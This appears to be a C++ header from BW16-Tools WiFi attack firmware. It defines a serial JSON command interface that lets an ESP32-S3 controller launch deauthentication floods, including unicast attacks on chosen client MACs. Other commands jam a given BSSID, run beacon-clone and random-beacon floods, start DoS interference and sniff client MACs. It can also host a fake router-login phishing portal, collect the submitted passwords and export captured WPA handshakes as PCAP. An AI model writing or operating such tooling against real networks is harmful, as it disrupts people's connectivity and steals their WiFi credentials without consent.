// ============ BW16 串口命令接口（供 ESP32-S3 控制中心） ============
// 协议：每行一个 JSON 对象，'\n' 结尾
//   请求: {"cmd":"<name>","id":<n>, ...参数}
//   应答: {"rsp":"<name>","id":<n>,"ok":true/false, ...}
//   大数据（扫描结果/钓鱼密码/PCAP）分块: "part":i,"total":n
// 本文件被 BW16-Tools.ino 在 setup() 之前 include，可直接使用 sketch 的函数与全局状态。
// 命令处理除 scan（故意阻塞 ~2.5s）外均为非阻塞，串口读循环每次 loop 最多处理一条。

#ifndef SERIAL_API_H
#define SERIAL_API_H

extern "C" size_t xPortGetFreeHeapSize(void);   // status 命令使用（声明原本在 .ino 后段）

void resetWiFiModuleSTA();   // 定义在 BW16-Tools.ino：把 WiFi 重置为 STA 模式（可扫描）
void startAttackAPMode();    // 定义在 BW16-Tools.ino：切 AP 模式并启动隐藏 AP 接口（raw 帧注入前提）
extern volatile unsigned long g_dbgAdvCount;   // 定义在 BW16-Tools.ino（include 点之后）
extern volatile unsigned long g_dbgLedCount;   // v24：LED 攻击分支执行计数
extern uint8_t g_hiddenJamBssid[6];            // v25n：手动 BSSID 目标（jam 命令）
extern int g_hiddenJamCh;
extern bool g_hiddenJamActive;

// --- Serial1(LP_UART) 引脚：使用默认 PB1/PB2，即板上排针 LP_UART_TXD / LP_UART_RXD ---
// 2026-10-01 实测：LP_UART 无法 mux 到 PA25/PA26（该对脚被 I2C 功能占用，boot 时仍输出 I2C 波形，
// 串口 TX 写进去无声）。因此不再重映射，直接用 SDK 默认引脚 PB1(TX)/PB2(RX)。
// 接线（S3 侧）：S3 GPIO17(TX) -> BW16 LP_UART_RXD；BW16 LP_UART_TXD -> S3 GPIO18(RX)；共地。
static bool g_serialPinsRemapped = false;
static void serialApiRemapPins() {
  g_serialPinsRemapped = true;   // no-op：使用 LP_UART 默认引脚 PB1/PB2
}

static const unsigned long BW16_UART_BAUD = 115200;
static const size_t BW16_SER_BUF_MAX = 1024;         // 单行上限
static const size_t BW16_SCAN_CHUNK  = 6;            // 每分块扫描结果条数
static const size_t BW16_PHISH_CHUNK = 10;           // 每分块钓鱼密码条数
static const size_t BW16_PCAP_CHUNK  = 1024;         // 每分块 PCAP 原始字节数（base64 后 ~1366）
static String g_serLine = "";
static unsigned long g_lastSerialRxMs = 0;           // 最后一次收到 S3 字节的时刻（RX 看门狗用）
static bool g_rxWatchdogArmed = true;                // 看门狗单次触发标志：重建一次后需收到流量才重新武装

static void serSendRaw(const String& s) {
  Serial1.print(s);
  Serial1.print('\n');
}

static String serHead(const char* rsp, int id) {
  return String("{\"rsp\":\"") + rsp + "\",\"id\":" + String(id);
}

// JSON 字符串转义（SSID 可能含引号/反斜杠/控制字符）
static String serEsc(const String& s) {
  String o; o.reserve(s.length() + 8);
  for (unsigned int i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == '"' || c == '\\') { o += '\\'; o += c; }
    else if ((unsigned char)c < 0x20) {
      char b[8];
      snprintf(b, sizeof(b), "\\u%04x", (unsigned char)c);
      o += b;
    } else {
      o += c;
    }
  }
  return o;
}

// 取整型字段（"key":123）
static int serGetInt(const String& line, const char* key, int def) {
  String pat = String("\"") + key + "\":";
  int p = line.indexOf(pat);
  if (p < 0) return def;
  p += pat.length();
  int end = p;
  while (end < (int)line.length() &&
         (isdigit(line[end]) || line[end] == '-' || line[end] == '+')) end++;
  return line.substring(p, end).toInt();
}

// 取字符串字段（"key":"value"，做反转义）
static String serGetStr(const String& line, const char* key) {
  String pat = String("\"") + key + "\":\"";
  int p = line.indexOf(pat);
  if (p < 0) return String("");
  p += pat.length();
  String o;
  while (p < (int)line.length()) {
    char c = line[p];
    if (c == '\\' && p + 1 < (int)line.length()) { o += line[p + 1]; p += 2; continue; }
    if (c == '"') break;
    o += c;
    p++;
  }
  return o;
}

static bool serHasFlag(const String& line, const char* key) {
  String pat = String("\"") + key + "\":true";
  return line.indexOf(pat) >= 0;
}

// base64 编码
static const char SER_B64T[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static String serB64(const uint8_t* data, size_t len) {
  String o;
  o.reserve(((len + 2) / 3) * 4);
  size_t i = 0;
  for (; i + 2 < len; i += 3) {
    uint32_t v = ((uint32_t)data[i] << 16) | ((uint32_t)data[i + 1] << 8) | data[i + 2];
    o += SER_B64T[(v >> 18) & 63]; o += SER_B64T[(v >> 12) & 63];
    o += SER_B64T[(v >> 6) & 63];  o += SER_B64T[v & 63];
  }
  if (i < len) {
    uint32_t v = (uint32_t)data[i] << 16;
    if (i + 1 < len) v |= (uint32_t)data[i + 1] << 8;
    o += SER_B64T[(v >> 18) & 63]; o += SER_B64T[(v >> 12) & 63];
    o += (i + 1 < len) ? SER_B64T[(v >> 6) & 63] : '=';
    o += '=';
  }
  return o;
}

// 扫描结果分块应答
static void serCmdScanResults(int id, int part) {
  size_t total = (scan_results.size() + BW16_SCAN_CHUNK - 1) / BW16_SCAN_CHUNK;
  if (total == 0) total = 1;
  if (part >= (int)total) part = (int)total - 1;
  size_t from = (size_t)part * BW16_SCAN_CHUNK;
  size_t to = from + BW16_SCAN_CHUNK;
  if (to > scan_results.size()) to = scan_results.size();
  String json = serHead("scan_results", id) + ",\"ok\":true,\"part\":" + String(part) +
                ",\"total\":" + String(total) + ",\"count\":" + String(scan_results.size()) +
                ",\"items\":[";
  for (size_t i = from; i < to; i++) {
    if (i > from) json += ",";
    bool isSel = false;
    for (int s : SelectedVector) { if (s == (int)i) { isSel = true; break; } }
    json += "{\"id\":" + String(i);
    json += ",\"ssid\":\"" + serEsc(scan_results[i].ssid) + "\"";
    json += ",\"bssid\":\"" + scan_results[i].bssid_str + "\"";
    json += ",\"channel\":" + String(scan_results[i].channel);
    json += ",\"rssi\":" + String(scan_results[i].rssi);
    json += ",\"security\":" + String(scan_results[i].security_type);
    json += ",\"selected\":" + String(isSel ? "true" : "false") + "}";
  }
  json += "]}";
  serSendRaw(json);
}

// 钓鱼密码分块应答
static void serCmdPhishPasswords(int id, int part) {
  size_t total = (web_test_submitted_texts.size() + BW16_PHISH_CHUNK - 1) / BW16_PHISH_CHUNK;
  if (total == 0) total = 1;
  if (part >= (int)total) part = (int)total - 1;
  size_t from = (size_t)part * BW16_PHISH_CHUNK;
  size_t to = from + BW16_PHISH_CHUNK;
  if (to > web_test_submitted_texts.size()) to = web_test_submitted_texts.size();
  String json = serHead("phish_passwords", id) + ",\"ok\":true,\"part\":" + String(part) +
                ",\"total\":" + String(total) + ",\"count\":" + String(web_test_submitted_texts.size()) +
                ",\"items\":[";
  for (size_t i = from; i < to; i++) {
    if (i > from) json += ",";
    json += "\"" + serEsc(web_test_submitted_texts[i]) + "\"";
  }
  json += "]}";
  serSendRaw(json);
}

// PCAP 分块应答（part: 0..total-1，每块 BW16_PCAP_CHUNK 字节，base64 编码）
static void serCmdCaptureData(int id, int part) {
  size_t size = globalPcapData.size();
  size_t total = (size + BW16_PCAP_CHUNK - 1) / BW16_PCAP_CHUNK;
  if (total == 0) total = 1;
  if (part < 0) part = 0;
  if (part >= (int)total) part = (int)total - 1;
  size_t from = (size_t)part * BW16_PCAP_CHUNK;
  size_t to = from + BW16_PCAP_CHUNK;
  if (to > size) to = size;
  String b64 = serB64((part < (int)total && to > from) ? &globalPcapData[from] : (const uint8_t*)"",
                      (to > from) ? (to - from) : 0);
  String json = serHead("capture_data", id) + ",\"ok\":true,\"part\":" + String(part) +
                ",\"total\":" + String(total) + ",\"pcapSize\":" + String((unsigned long)size) +
                ",\"data\":\"" + b64 + "\"}";
  serSendRaw(json);
}

static void serHandleCommand(const String& line) {
  // 行首可能带杂波/半行残留（S3 重启时 TX 漂移、杜邦线接触瞬间的电平毛刺都不带换行符），
  // 它们会累积在 g_serLine 里并与真命令拼接。用 lastIndexOf 定位最后一条完整命令，
  // id 也只在命令段内查找，避免被行首垃圾污染导致应答 id 错乱、S3 永远超时。
  String pat = "\"cmd\":\"";
  int p = line.lastIndexOf(pat);
  if (p < 0) return;          // 非命令行（噪声），忽略
  p += pat.length();
  int q = line.indexOf('"', p);
  if (q < 0) return;
  String cmd = line.substring(p, q);
  int id = serGetInt(line.substring(p), "id", 0);

  if (cmd == "ping") {
    serSendRaw(serHead("pong", id) + ",\"ok\":true,\"fw\":\"BW16-Tools S3Bridge v1\"}");
  }
  else if (cmd == "status") {
    String json = serHead("status", id) + ",\"ok\":true";
    json += ",\"web_ui_active\":" + String(web_ui_active ? "true" : "false");
    json += ",\"web_test_active\":" + String(web_test_active ? "true" : "false");
    json += ",\"deauth_running\":" + String(g_deauthState.running ? "true" : "false");
    json += ",\"deauth_mode\":" + String((int)g_deauthState.mode);
    json += ",\"deauth_packets\":" + String((unsigned long)g_deauthState.packetCount);
    json += ",\"dbg_p1\":" + String((unsigned long)g_dbgP1Count);
    json += ",\"dbg_p2\":" + String((unsigned long)g_dbgP2Count);
    json += ",\"dbg_p2a\":" + String((unsigned long)g_dbgP2aCount);
    json += ",\"dbg_p2b\":" + String((unsigned long)g_dbgP2bCount);
    json += ",\"dbg_p2c\":" + String((unsigned long)g_dbgP2cCount);
    json += ",\"dbg_p3\":" + String((unsigned long)g_dbgP3Count);
    json += ",\"dbg_adv\":" + String((unsigned long)g_dbgAdvCount);
    json += ",\"dbg_led\":" + String((unsigned long)g_dbgLedCount);
    json += ",\"beacon_attack\":" + String(beaconAttackRunning ? "true" : "false");
    json += ",\"adv_attack\":" + String((int)g_advAttack);
    json += ",\"sniffer_running\":" + String(hs_sniffer_running ? "true" : "false");
    json += ",\"sniffer_active\":" + String(sniffer_active ? "true" : "false");
    json += ",\"captured\":" + String((handshakeDataAvailable || isHandshakeCaptured) ? "true" : "false");
    json += ",\"pcap_size\":" + String((unsigned long)globalPcapData.size());
    json += ",\"selected_count\":" + String(SelectedVector.size());
    json += ",\"scan_count\":" + String(scan_results.size());
    json += ",\"heap\":" + String((unsigned long)xPortGetFreeHeapSize());
    json += ",\"uptime\":" + String(millis() / 1000) + "}";
    serSendRaw(json);
  }
  else if (cmd == "scan") {
    int r = scanNetworks();
    wext_set_channel(WLAN0_NAME, WEB_UI_CHANNEL);
    if (scan_results.size() == 0) {
      // 射频卡在 AP 模式/异常状态时扫描恒为 0：重置为 STA 模式并补扫一次
      Serial.println("[S3Bridge] scan=0, re-init WiFi to STA + rescan");
      resetWiFiModuleSTA();
      r = scanNetworks();
      wext_set_channel(WLAN0_NAME, WEB_UI_CHANNEL);
    }
    serSendRaw(serHead("scan", id) + ",\"ok\":" + String(r == 0 ? "true" : "false") +
               ",\"count\":" + String(scan_results.size()) + "}");
  }
  else if (cmd == "scan_results") {
    serCmdScanResults(id, serGetInt(line, "part", 0));
  }
  else if (cmd == "select") {
    if (serHasFlag(line, "all")) {
      SelectedVector.clear();
      for (size_t i = 0; i < scan_results.size(); i++) SelectedVector.push_back(i);
    } else if (serHasFlag(line, "clear")) {
      SelectedVector.clear();
    } else {
      int target = serGetInt(line, "target", -1);
      bool sel = serHasFlag(line, "selected");
      auto it = std::find(SelectedVector.begin(), SelectedVector.end(), target);
      if (target >= 0) {
        if (sel && it == SelectedVector.end()) SelectedVector.push_back(target);
        else if (!sel && it != SelectedVector.end()) SelectedVector.erase(it);
      }
    }
    if (!SelectedVector.empty() && SelectedVector[0] < (int)scan_results.size()) {
      hs_selected_network = scan_results[SelectedVector[0]];
      hs_has_selection = true;
      memcpy(_selectedNetwork.bssid, hs_selected_network.bssid, 6);
      _selectedNetwork.ssid = hs_selected_network.ssid;
      _selectedNetwork.ch = hs_selected_network.channel;
      AP_Channel = String(hs_selected_network.channel);
    }
    serSendRaw(serHead("select", id) + ",\"ok\":true,\"selected_count\":" + String(SelectedVector.size()) + "}");
  }
  else if (cmd == "deauth") {
    String mode = serGetStr(line, "mode");
    if (mode.length() == 0) mode = "single";
    int packets = serGetInt(line, "packets", 0);
    if (packets > 0 && packets <= 50) {
      perdeauth = packets;
      g_deauthState.packetsPerCycle = packets;
    }
    g_enhancedDeauthMode = serHasFlag(line, "enhanced");
    // v25e：可选定向客户端 MAC（单播 deauth，Windows 等忽略广播 deauth 的设备也能踢）
    String clientMacStr = serGetStr(line, "clientMac");
    if (clientMacStr.length() >= 17) {
      unsigned int b[6];
      if (sscanf(clientMacStr.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6) {
        for (int i = 0; i < 6; i++) g_clientMac[i] = (uint8_t)b[i];
        g_clientMacValid = true;
      } else {
        g_clientMacValid = false;
      }
    } else {
      g_clientMacValid = false;
    }
    bool needTarget = (mode == "single" || mode == "multi");
    if (needTarget && SelectedVector.empty()) {
      serSendRaw(serHead("deauth", id) + ",\"ok\":false,\"message\":\"请先选择目标\"}");
      return;
    }
    if (mode == "all") startAllAttack();
    else if (mode == "auto_single") startAutoSingleAttack();
    else if (mode == "auto_multi") startAutoMultiAttack();
    else if (mode == "beacon_deauth") startBeaconDeauthAttack();
    else if (mode == "multi") startMultiAttack();
    else { scrollindex = SelectedVector[0]; startSingleAttack(); }
    serSendRaw(serHead("deauth", id) + ",\"ok\":true,\"mode\":\"" + mode + "\"}");
  }
  else if (cmd == "sniff") {  // v25f：嗅探目标 AP 的客户端（promiscuous 抓 MAC）
    // 需要已选目标（提供 AP BSSID + 信道）；sec 可选默认 20
    if (SelectedVector.empty()) {
      serSendRaw(serHead("sniff", id) + ",\"ok\":false,\"message\":\"请先在扫描页勾选目标\"}");
      return;
    }
    int idx = SelectedVector[0];
    if (idx < 0 || idx >= (int)scan_results.size()) {
      serSendRaw(serHead("sniff", id) + ",\"ok\":false,\"message\":\"目标索引失效，请重新扫描勾选\"}");
      return;
    }
    int sec = serGetInt(line, "sec", 20);
    if (sec < 3) sec = 3;
    if (sec > 60) sec = 60;
    bool induce = serGetInt(line, "induce", 0) != 0;
    sniffClients(scan_results[idx].bssid, scan_results[idx].channel, sec, induce);
    String json = serHead("sniff", id) + ",\"ok\":true,\"count\":" + String(g_sniffClientCount) + ",\"clients\":[";
    for (int i = 0; i < g_sniffClientCount; i++) {
      if (i) json += ",";
      json += "{\"mac\":\"" + sniffMacStr(g_sniffClients[i].mac)
              + "\",\"rssi\":" + String(g_sniffClients[i].rssi)
              + ",\"frames\":" + String(g_sniffClients[i].frames) + "}";
    }
    json += "]}";
    serSendRaw(json);
  }
  else if (cmd == "jam") {  // v25n：手动 BSSID 单信道压制（隐藏 AP 扫描不到时用）
    String bssidStr = serGetStr(line, "bssid");
    int ch = serGetInt(line, "ch", -1);
    if (bssidStr.length() != 17 || ch < 1) {
      serSendRaw(serHead("jam", id) + ",\"ok\":false,\"message\":\"用法: jam bssid=XX:XX:XX:XX:XX:XX&ch=N\"}");
      return;
    }
    int b[6];
    if (sscanf(bssidStr.c_str(), "%2x:%2x:%2x:%2x:%2x:%2x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6) {
      serSendRaw(serHead("jam", id) + ",\"ok\":false,\"message\":\"bssid 格式错误\"}");
      return;
    }
    for (int i = 0; i < 6; i++) g_hiddenJamBssid[i] = (uint8_t)b[i];
    g_hiddenJamCh = ch;
    g_hiddenJamActive = true;
    g_advAttack = ADV_CI;
    startAttackLED();
    serSendRaw(serHead("jam", id) + ",\"ok\":true,\"bssid\":\"" + bssidStr + "\",\"ch\":" + String(ch) + "}");
  }
  else if (cmd == "beacon") {
    String type = serGetStr(line, "type");
    if (type.length() == 0) type = "random";
    if (serGetStr(line, "band") == "5g") beaconBandMode = 1;
    else if (serGetStr(line, "band") == "2g") beaconBandMode = 2;
    else beaconBandMode = 0;
    if (type == "clone") {
      if (SelectedVector.empty()) {
        serSendRaw(serHead("beacon", id) + ",\"ok\":false,\"message\":\"请先选择目标AP\"}");
        return;
      }
      g_advAttack = ADV_BEACON_CLONE;
      startAttackLED();
    } else if (type == "custom") {
      String ssid = serGetStr(line, "ssid");
      if (ssid.length() == 0) ssid = "Free_WiFi_VIP";
      startCustomBeaconFromWeb(ssid);
    } else {
      g_advAttack = ADV_BEACON_RANDOM;
      startAttackLED();
    }
    serSendRaw(serHead("beacon", id) + ",\"ok\":true,\"type\":\"" + type + "\"}");
  }
  else if (cmd == "ci" || cmd == "bbh" || cmd == "dos") {
    if (SelectedVector.empty()) {
      serSendRaw(serHead(cmd.c_str(), id) + ",\"ok\":false,\"message\":\"请先选择目标\"}");
      return;
    }
    // v21：高级干扰同样需要 AP 接口工作状态才能让 raw 帧真正发出去
    // （STA 模式下 beacon/probe 静默无效——此前 ci/bbh/dos"无效果"的根因）
    startAttackAPMode();
    if (cmd == "ci") g_advAttack = ADV_CI;
    else if (cmd == "bbh") g_advAttack = ADV_BBH;
    else g_advAttack = ADV_DOS;
    startAttackLED();
    serSendRaw(serHead(cmd.c_str(), id) + ",\"ok\":true}");
  }
  else if (cmd == "stop") {
    stopAllAttacks();
    serSendRaw(serHead("stop", id) + ",\"ok\":true}");
  }
  else if (cmd == "phishing") {
    if (serGetInt(line, "template", 1) == 2) g_apSelectedPage = (int)AP_WEB_TEST;
    else g_apSelectedPage = (int)AP_WEB_ROUTER_AUTH;
    String ssid = serGetStr(line, "ssid");
    if (ssid.length() > 0) web_test_ssid_dynamic = ssid;
    startWebTest();
    serSendRaw(serHead("phishing", id) + ",\"ok\":true}");
  }
  else if (cmd == "phish_passwords") {
    serCmdPhishPasswords(id, serGetInt(line, "part", 0));
  }
  else if (cmd == "phish_clear") {
    web_test_submitted_texts.clear();
    serSendRaw(serHead("phish_clear", id) + ",\"ok\":true}");
  }
  else if (cmd == "capture") {
    String bssid = serGetStr(line, "bssid");
    hs_has_selection = false;
    if (bssid.length() > 0) {
      for (size_t i = 0; i < scan_results.size(); i++) {
        if (scan_results[i].bssid_str == bssid) {
          hs_selected_network = scan_results[i];
          hs_has_selection = true;
          break;
        }
      }
    }
    if (!hs_has_selection) {
      serSendRaw(serHead("capture", id) + ",\"ok\":false,\"message\":\"bssid不在扫描列表中，请先scan\"}");
      return;
    }
    memcpy(_selectedNetwork.bssid, hs_selected_network.bssid, 6);
    _selectedNetwork.ssid = hs_selected_network.ssid;
    _selectedNetwork.ch = hs_selected_network.channel;
    AP_Channel = String(current_channel);
    String mode = serGetStr(line, "mode");
    if (mode == "passive") { g_captureMode = CAPTURE_MODE_PASSIVE; g_captureDeauthEnabled = false; }
    else if (mode == "efficient") { g_captureMode = CAPTURE_MODE_EFFICIENT; g_captureDeauthEnabled = false; }
    else { g_captureMode = CAPTURE_MODE_ACTIVE; g_captureDeauthEnabled = true; }
    isHandshakeCaptured = false;
    handshakeDataAvailable = false;
    readyToSniff = true;
    hs_sniffer_running = true;
    startHandshakeLED();
    serSendRaw(serHead("capture", id) + ",\"ok\":true,\"ssid\":\"" + serEsc(hs_selected_network.ssid) + "\"}");
  }
  else if (cmd == "capture_stop") {
    readyToSniff = false;
    hs_sniffer_running = false;
    serSendRaw(serHead("capture_stop", id) + ",\"ok\":true}");
  }
  else if (cmd == "capture_status") {
    size_t savedSize = (size_t)globalPcapData.size();
    bool captured = handshakeDataAvailable || (savedSize > 0) || isHandshakeCaptured;
    String json = serHead("capture_status", id) + ",\"ok\":true";
    json += ",\"running\":" + String(hs_sniffer_running ? "true" : "false");
    json += ",\"captured\":" + String(captured ? "true" : "false");
    json += ",\"justCaptured\":" + String(handshakeJustCaptured ? "true" : "false");
    json += ",\"hsCount\":" + String((unsigned long)lastCaptureHSCount);
    json += ",\"mgmtCount\":" + String((unsigned long)lastCaptureMgmtCount);
    json += ",\"pcapSize\":" + String((unsigned long)savedSize) + "}";
    serSendRaw(json);
    if (handshakeJustCaptured) handshakeJustCaptured = false;
  }
  else if (cmd == "capture_data") {
    serCmdCaptureData(id, serGetInt(line, "part", 0));
  }
  else if (cmd == "capture_clear") {
    resetGlobalHandshakeData();
    serSendRaw(serHead("capture_clear", id) + ",\"ok\":true}");
  }
  else if (cmd == "reboot") {
    serSendRaw(serHead("reboot", id) + ",\"ok\":true}");
    delay(500);
    sys_reset();
  }
  else {
    serSendRaw(serHead("error", id) + ",\"ok\":false,\"message\":\"unknown cmd\"}");
  }
}

static void serialApiInit() {
  serialApiRemapPins();
  Serial1.begin(BW16_UART_BAUD);
  g_serLine = "";
  g_lastSerialRxMs = millis();
  delay(50);
  serSendRaw("{\"evt\":\"boot\",\"fw\":\"BW16-Tools S3Bridge v1\"}");
}

// 非阻塞读：每次 loop 最多处理一条完整命令，避免拖慢攻击节奏
static void serialApiLoop() {
  // RX 看门狗（单次触发）：S3 重启/插拔瞬间其 TX 漂移会产生垃圾洪流，
  // LP_UART RX 过载后会锁死（overrun，不再收包，直到复位）。
  // 15 秒收不到任何字节就重建一次串口外设；重建后必须等到新流量才重新武装，
  // 绝不循环 end/begin（反复重建会干扰 KM0 共享总线，导致 WiFi 扫描失效——v4 教训）。
  if (Serial1.available() > 0) {
    g_lastSerialRxMs = millis();
    g_rxWatchdogArmed = true;
  } else if (g_rxWatchdogArmed && g_lastSerialRxMs != 0 && millis() - g_lastSerialRxMs > 15000) {
    Serial1.end();
    delay(20);
    Serial1.begin(BW16_UART_BAUD);
    g_serLine = "";
    g_lastSerialRxMs = millis();
    g_rxWatchdogArmed = false;
    Serial.println("[S3Bridge] UART RX watchdog: re-init Serial1 (one-shot)");
  }
  while (Serial1.available()) {
    char c = (char)Serial1.read();
    if (c == '\r') continue;
    if (c == '\n') {
      if (g_serLine.length() > 0) {
        serHandleCommand(g_serLine);
        g_serLine = "";
      }
      return;
    }
    g_serLine += c;
    if (g_serLine.length() > BW16_SER_BUF_MAX) { g_serLine = ""; return; }
  }
}

#endif // SERIAL_API_H
